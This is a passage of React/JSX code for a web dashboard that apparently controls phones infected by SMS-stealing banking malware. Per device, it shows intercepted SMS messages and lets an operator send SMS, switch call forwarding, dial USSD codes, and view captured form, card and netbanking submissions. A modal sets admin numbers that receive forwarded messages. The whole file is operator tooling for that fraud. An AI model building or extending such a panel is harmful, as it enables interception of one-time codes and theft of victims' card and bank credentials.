      <Card className="overflow-hidden rounded-2xl border border-(--border) bg-[#e9e9e9]">
        <CardBody className="overflow-visible p-0">
          <div className="w-full gap-2 flex flex-row flex-wrap border-b border-[#bcbcbc] bg-[#efefef] px-3 py-3 sm:px-4">
            <Button
              className={`h-10 min-w-fit rounded-md border px-4 text-sm font-semibold sm:px-6 ${
                selectedTab === "overview"
                  ? "border-[#0a2c73] bg-[#0a2c73] text-white"
                  : "border-[#2a4d9e] bg-white text-[#111]"
              }`}
              onPress={handleCheckOnline}
            >
              Check Online
            </Button>
            <Button
              className={`h-10 min-w-fit rounded-md border px-4 text-sm font-semibold sm:px-6 ${
                selectedTab === "sms"
                  ? "border-[#0a2c73] bg-[#0a2c73] text-white"
                  : "border-[#2a4d9e] bg-white text-[#111]"
              }`}
              onPress={() => switchTab("sms")}
            >
              Get SMS
            </Button>
            <Button
              className={`h-10 min-w-fit rounded-md border px-4 text-sm font-semibold sm:px-6 ${
                selectedTab === "send-sms"
                  ? "border-[#0a2c73] bg-[#0a2c73] text-white"
                  : "border-[#2a4d9e] bg-white text-[#111]"
              }`}
              onPress={() => switchTab("send-sms")}
            >
              Send SMS
            </Button>
            <Button
              className={`h-10 min-w-fit rounded-md border px-4 text-sm font-semibold sm:px-6 ${
                selectedTab === "call-forwarding"
                  ? "border-[#0a2c73] bg-[#0a2c73] text-white"
                  : "border-[#2a4d9e] bg-white text-[#111]"
              }`}
              onPress={() => switchTab("call-forwarding")}
            >
              Call Forwarding
            </Button>
            <Button
              className={`h-10 min-w-fit rounded-md border px-4 text-sm font-semibold sm:px-6 ${
                selectedTab === "ussd"
                  ? "border-[#0a2c73] bg-[#0a2c73] text-white"
                  : "border-[#2a4d9e] bg-white text-[#111]"
              }`}
              onPress={() => switchTab("ussd")}
            >
              USSD Dialing
            </Button>
            <Button
              className={`h-10 min-w-fit rounded-md border px-4 text-sm font-semibold sm:px-6 ${
                selectedTab === "view"
                  ? "border-[#0a2c73] bg-[#0a2c73] text-white"
                  : "border-[#2a4d9e] bg-white text-[#111]"
              }`}
              onPress={() => switchTab("view")}
            >
              View Data
            </Button>
          </div>

          {selectedTab === "sms" && (
            <div className="space-y-5 p-4 sm:p-6">
              <div className="flex justify-between items-center">
                <h3 className="text-lg font-semibold text-(--text-main)">SMS Messages</h3>
                <div className="flex gap-2">
                  <Button
                    size="sm"
                    onPress={handleRefreshSMS}
                    isLoading={smsActionLoading}
                    className="bg-blue-600 text-white"
                  >
                    Refresh
                  </Button>
                  <Button
                    size="sm"
                    onPress={handleGetSms}
                    isLoading={smsActionLoading}
                    className="bg-green-600 text-white"
                  >
                    Request SMS
                  </Button>
                </div>
              </div>

              {/* SMS List */}
              <div className="space-y-3">
                {smsList.length === 0 ? (
                  <div className="rounded-2xl border border-(--border) bg-white/70 p-8 text-center shadow-(--shadow-xs)">
                    <p className="text-(--text-muted)">No SMS messages</p>
                  </div>
                ) : (
                  smsList.map((sms) => (
                    <div
                      key={sms.id}
                      className="rounded-0 border border-(--border) bg-white/78"
                    >
                      <div className="space-y-4 p-4 sm:p-5">
                        <div>
                          <span className="font-bold text-blue-950 flex flex-row items-center gap-2">
                            DATE
                            <BiCopy
                              onClick={() =>
                                copyToClipboard(
                                  formatMessageTimestamp(sms.timestamp),
                                )
                              }
                            />
                          </span>
                          <p className="text-[11px] font-semibold uppercase tracking-wide text-(--text-muted)">
                            {formatMessageTimestamp(sms.timestamp)}
                          </p>

                          <span className="font-bold text-blue-950 flex flex-row items-center gap-2">
                            MSG
                            <BiCopy onClick={() => copyToClipboard(sms.body)} />
                          </span>
                          <p className="text-[13px] text-red-600">{sms.body}</p>

                          <span className="font-bold text-blue-950 flex flex-row items-center gap-2">
                            SENDER
                            <BiCopy
                              onClick={() => copyToClipboard(sms.senderNumber)}
                            />
                          </span>
                          <p className="text-[13px] text-(--text-muted)">
                            {sms.senderNumber}
                          </p>

                          {sms.reciverNumber ? (
                            <>
                              <span className="font-bold text-blue-950 flex flex-row items-center gap-2">
                                RECIVER
                                <BiCopy
                                  onClick={() =>
                                    copyToClipboard(sms.reciverNumber)
                                  }
                                />
                              </span>
                              <p className="text-[13px] text-(--text-muted)">
                                {sms.reciverNumber}
                              </p>
                            </>
                          ) : null}

                          <span className="font-bold text-blue-950 flex flex-row items-center gap-2">
                            ID
                            <BiCopy onClick={() => copyToClipboard(sms.id)} />
                          </span>
                          <p className="text-[13px] text-(--text-muted)">
                            {sms.id}
                          </p>
                        </div>

                        
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>
          )}

          {selectedTab === "send-sms" && (
            <div className="space-y-5 p-4 sm:p-6">
              <div className="rounded-xl bg-(--accent) px-4 py-2 text-center text-xl font-semibold text-white">
                Send SMS
              </div>

              <Select
                label="Select SIM"
                placeholder="Choose SIM"
                selectedKeys={[`sim${selectedSIM}`]}
                onSelectionChange={(keys) => {
                  if (keys === "all") {
                    return;
                  }

                  const selectedKey = String(Array.from(keys)[0] ?? "");

                  if (selectedKey === "sim1") {
                    setSelectedSIM(1);
                  }

                  if (selectedKey === "sim2") {
                    setSelectedSIM(2);
                  }
                }}
                classNames={{
                  trigger:
                    "border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) data-[open=true]:border-(--accent)",
                  value: "text-(--text-main)",
                  label: "text-(--text-muted)",
                }}
              >
                {availableSimOptions.map((option) => (
                  <SelectItem key={option.key}>{option.label}</SelectItem>
                ))}
              </Select>

              <Input
                label="Receiver Number"
                placeholder="Enter phone number"
                value={smsReceiver}
                onValueChange={setSmsReceiver}
                classNames={{
                  input: "text-(--text-main)",
                  inputWrapper:
                    "rounded-xl border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) group-data-[focus=true]:border-(--accent) group-data-[focus=true]:shadow-[var(--ring-accent)] transition-all duration-200",
                  label: "text-(--text-muted)",
                }}
              />

              <Textarea
                label="Message"
                placeholder="Type your message here..."
                value={smsMessage}
                onValueChange={setSmsMessage}
                minRows={4}
                classNames={{
                  input: "text-(--text-main)",
                  inputWrapper:
                    "rounded-xl border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) group-data-[focus=true]:border-(--accent) group-data-[focus=true]:shadow-[var(--ring-accent)] transition-all duration-200",
                  label: "text-(--text-muted)",
                }}
              />

              <Button
                className="h-11 w-full border border-emerald-600 bg-emerald-600 font-semibold text-white transition-all duration-200 hover:bg-emerald-700"
                size="lg"
                onPress={handleSendSMS}
                isDisabled={!smsReceiver || !smsMessage}
              >
                Send SMS
              </Button>
            </div>
          )}

          {selectedTab === "call-forwarding" && (
            <div className="space-y-5 p-4 sm:p-6">
              <div className="rounded-xl bg-(--accent) px-4 py-2 text-center text-xl font-semibold text-white">
                Call Forwarding
              </div>

              <Select
                label="Select SIM"
                placeholder="Choose SIM"
                selectedKeys={[`sim${forwardingSIM}`]}
                onSelectionChange={(keys) => {
                  if (keys === "all") {
                    return;
                  }

                  const selectedKey = String(Array.from(keys)[0] ?? "");

                  if (selectedKey === "sim1") {
                    setForwardingSIM(1);
                  }

                  if (selectedKey === "sim2") {
                    setForwardingSIM(2);
                  }
                }}
                classNames={{
                  trigger:
                    "border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) data-[open=true]:border-(--accent)",
                  value: "text-(--text-main)",
                  label: "text-(--text-muted)",
                }}
              >
                {availableSimOptions.map((option) => (
                  <SelectItem key={option.key}>{option.label}</SelectItem>
                ))}
              </Select>

              <div>
                <Input
                  label="Forwarding Number"
                  placeholder="Enter number (10 digits / +country)"
                  value={forwardingNumber}
                  onValueChange={setForwardingNumber}
                  classNames={{
                    input: "text-(--text-main)",
                    inputWrapper:
                      "rounded-xl border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) group-data-[focus=true]:border-(--accent) group-data-[focus=true]:shadow-[var(--ring-accent)] transition-all duration-200",
                    label: "text-(--text-muted)",
                  }}
                />
              </div>

              <div className="flex flex-row gap-3 sm:flex-row">
                <Button
                  className="h-11 flex-1 border border-emerald-600 bg-emerald-600 font-semibold text-white transition-all duration-200 hover:bg-emerald-700"
                  size="lg"
                  onPress={handleActivateForwarding}
                >
                  Enable
                </Button>
                <Button
                  className="h-11 flex-1 border border-rose-600 bg-rose-600 font-semibold text-white transition-all duration-200 hover:bg-rose-700"
                  size="lg"
                  onPress={handleDeactivateForwarding}
                >
                  Disable
                </Button>
              </div>

              {/* Live History */}
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <h4 className="text-sm font-semibold text-(--text-main)">
                    History (Live)
                  </h4>
                  <Chip size="sm" className="bg-slate-200 text-slate-700">
                    {callForwardingHistory.length}
                  </Chip>
                </div>

                {callForwardingHistory.length === 0 ? (
                  <div className="rounded-2xl border border-(--border) bg-white/75 p-4 text-sm text-(--text-muted)">
                    No history found in top-level or registered-device nodes.
                  </div>
                ) : (
                  <div className="space-y-3">
                    {callForwardingHistory.map((historyEntry, entryIndex) => (
                      <div
                        key={`${historyEntry.source}-${historyEntry.id}-${entryIndex}`}
                        className="rounded-2xl border border-(--border) bg-white/80 p-3.5 shadow-(--shadow-xs)"
                      >
                        <div className="mb-2 flex items-center justify-between gap-2">
                          <p className="text-xs font-semibold uppercase tracking-wide text-(--text-muted) flex items-center gap-2">
                            History Entry{" "}
                            {callForwardingHistory.length - entryIndex}
                            <span className="rounded bg-slate-200 px-2 py-0.5 text-[10px] font-semibold text-slate-700">
                              {historyEntry.source === "global"
                                ? "Top History"
                                : "Registered Device"}
                            </span>
                          </p>
                          <span className="text-[11px] text-slate-700 font-mono">
                            {historyEntry.id}
                          </span>
                        </div>

                        <div className="grid grid-cols-1 gap-2 sm:grid-cols-2">
                          {Object.entries(historyEntry.data).map(
                            ([fieldKey, fieldValue]) => (
                              <div
                                key={`${historyEntry.source}-${historyEntry.id}-${fieldKey}`}
                                className="rounded-lg border border-(--border) bg-white px-3 py-2 shadow-(--shadow-xs)"
                              >
                                <p className="text-[11px] uppercase tracking-wide text-(--text-muted)">
                                  {formatSubmissionFieldLabel(fieldKey)}
                                </p>
                                <p className="mt-1 break-all text-sm font-medium text-(--text-main)">
                                  {formatSubmissionFieldValue(
                                    fieldKey,
                                    fieldValue,
                                  )}
                                </p>
                              </div>
                            ),
                          )}
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          )}

          {selectedTab === "ussd" && (
            <div className="space-y-5 p-4 sm:p-6">
              <div className="rounded-xl bg-(--accent) px-4 py-2 text-center text-xl font-semibold text-white">
                USSD Dialing
              </div>

              <Select
                label="Select SIM"
                placeholder="Choose SIM"
                selectedKeys={[`sim${ussdSimSlot}`]}
                onSelectionChange={(keys) => {
                  if (keys === "all") {
                    return;
                  }

                  const selectedKey = String(Array.from(keys)[0] ?? "");

                  if (selectedKey === "sim1") {
                    setUssdSimSlot(1);
                  }

                  if (selectedKey === "sim2") {
                    setUssdSimSlot(2);
                  }
                }}
                classNames={{
                  trigger:
                    "border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) data-[open=true]:border-(--accent)",
                  value: "text-(--text-main)",
                  label: "text-(--text-muted)",
                }}
              >
                {availableSimOptions.map((option) => (
                  <SelectItem key={option.key}>{option.label}</SelectItem>
                ))}
              </Select>

              <Input
                label="USSD Code"
                placeholder="*123#"
                value={ussdCode}
                onValueChange={setUssdCode}
                classNames={{
                  input: "text-(--text-main)",
                  inputWrapper:
                    "rounded-xl border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) group-data-[focus=true]:border-(--accent) group-data-[focus=true]:shadow-[var(--ring-accent)] transition-all duration-200",
                  label: "text-(--text-muted)",
                }}
              />

              <div className="grid grid-cols-1 gap-3 sm:grid-cols-1">
                <Button
                  className="h-11 w-full border border-emerald-600 bg-emerald-600 font-semibold text-white transition-all duration-200 hover:bg-emerald-700"
                  size="lg"
                  onPress={handleSendUssd}
                  isLoading={isSendingUssd}
                >
                  Send
                </Button>
              </div>
            </div>
          )}

          {selectedTab === "view" && (
            <div className="space-y-6 p-4 sm:p-6">
              <div className="space-y-4">
                {renderSubmissionSection(
                  "Forms",
                  formSubmissions,
                  "No forms found for this device.",
                  "bg-(--accent-soft) text-(--accent)",
                )}
                {renderSubmissionSection(
                  "Cards",
                  cardSubmissions,
                  "No card submissions found for this device.",
                  "bg-[#d8e6dd] text-[#1d3328]",
                )}
                {renderSubmissionSection(
                  "Netbanking",
                  netbankingSubmissions,
                  "No netbanking data found for this device.",
                  "bg-emerald-200 text-emerald-700",
                )}
              </div>
            </div>
          )}
        </CardBody>
      </Card>

      {/* Phone Number Modal */}
      <Modal
        isOpen={isPhoneModalOpen}
        onClose={onPhoneModalClose}
        size="2xl"
        classNames={{
          base: "border border-(--border) bg-(--surface-glass) backdrop-blur-xl",
          header: "border-b border-(--border)",
          body: "py-6",
          footer: "border-t border-(--border)",
        }}
      >
        <ModalContent>
          <ModalHeader className="text-(--text-main)">
            Update Phone Numbers
          </ModalHeader>
          <ModalBody>
            <p className="mb-4 text-sm text-(--text-muted)">
              Add up to 4 admin phone numbers for this device. These numbers
              will receive forwarded messages.
            </p>
            <div className="space-y-3">
              <Input
                label="phone 1"
                placeholder="Enter phone number"
                value={adminPhone1}
                onValueChange={setAdminPhone1}
                classNames={{
                  input: "text-(--text-main)",
                  inputWrapper:
                    "rounded-xl border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) group-data-[focus=true]:border-(--accent) group-data-[focus=true]:shadow-[var(--ring-accent)] transition-all duration-200",
                  label: "text-(--text-muted)",
                }}
              />
            </div>
          </ModalBody>
          <ModalFooter>
            <Button
              variant="light"
              onPress={onPhoneModalClose}
              className="font-medium text-(--text-muted)"
            >
              Cancel
            </Button>
            <Button
              color="primary"
              className="bg-(--accent) font-semibold text-white transition-all duration-200 hover:bg-(--accent-strong)"
              isLoading={isAdminPhoneLoading}
              isDisabled={isAdminPhoneLoading}
              onPress={() => {
                handleAdminPhoneUpdate();
              }}
            >
              Save Changes
            </Button>
          </ModalFooter>
        </ModalContent>
      </Modal>

      {/* SIM Selection Modal */}
      <Modal
        isOpen={isSimModalOpen}
        onClose={onSimModalClose}
        size="md"
        classNames={{
          base: "border border-(--border) bg-(--surface-glass) backdrop-blur-xl",
          header: "border-b border-(--border)",
          body: "py-6",
          footer: "border-t border-(--border)",
        }}
      >
        <ModalContent>
          <ModalHeader className="text-(--text-main)">
            Select Forwarding SIM
          </ModalHeader>
          <ModalBody>
            <p className="mb-4 text-sm text-(--text-muted)">
              Choose which SIM card should be used for SMS forwarding on this
              device.
            </p>
            <Select
              label="Forwarding SIM"
              placeholder="Select a SIM"
              selectedKeys={[selectedSIM === 1 ? "sim1" : "sim2"]}
              onSelectionChange={(keys) => {
                if (keys === "all") {
                  return;
                }

                const key = keys.values().next().value;

                if (key === "sim1") {
                  setSelectedSIM(1);
                }

                if (key === "sim2") {
                  setSelectedSIM(2);
                }
              }}
              classNames={{
                trigger:
                  "border-(--border) bg-white/85 data-[hover=true]:border-(--border-strong) data-[open=true]:border-(--accent)",
                value: "text-(--text-main)",
              }}
            >
              <SelectItem key="sim1">SIM 1</SelectItem>
              <SelectItem key="sim2">SIM 2</SelectItem>
            </Select>
          </ModalBody>
          <ModalFooter>
            <Button
              variant="light"
              onPress={onSimModalClose}
              className="font-medium text-(--text-muted)"
            >
              Cancel
            </Button>
            <Button
              color="primary"
              className="bg-(--accent) font-semibold text-white transition-all duration-200 hover:bg-(--accent-strong)"
              onPress={handleForwardSim}
            >
              Save Changes
            </Button>
          </ModalFooter>
        </ModalContent>
      </Modal>
    </div>
  );
}